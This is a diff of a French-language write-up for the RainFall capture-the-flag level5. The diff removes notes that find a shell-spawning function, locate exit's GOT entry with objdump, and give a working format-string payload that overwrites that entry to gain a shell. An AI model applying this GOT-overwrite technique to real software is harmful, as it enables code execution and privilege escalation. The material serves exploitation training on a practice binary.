@@ -1,26 +1,3 @@
-fonction o() qui /bin/sh 
-
-gdb ./level5
-info address o = adresse de la fonction.
-
-level5@RainFall:~$ objdump -R level5
-
-level5:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE 
-
-08049838 R_386_JUMP_SLOT   exit
-
-
-08049838 adresse GOT de Exit
-
-But: ecrire a l'emplacement de l'adresse exit **0x8049838** l'adresse de o() **0x80484a4** afin que l'appel exit nous redirige vers o()
-
-(echo -e "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn"; cat) | ./level5
-
-
-
 # level05
 
 1. Decompilation with Ghidra
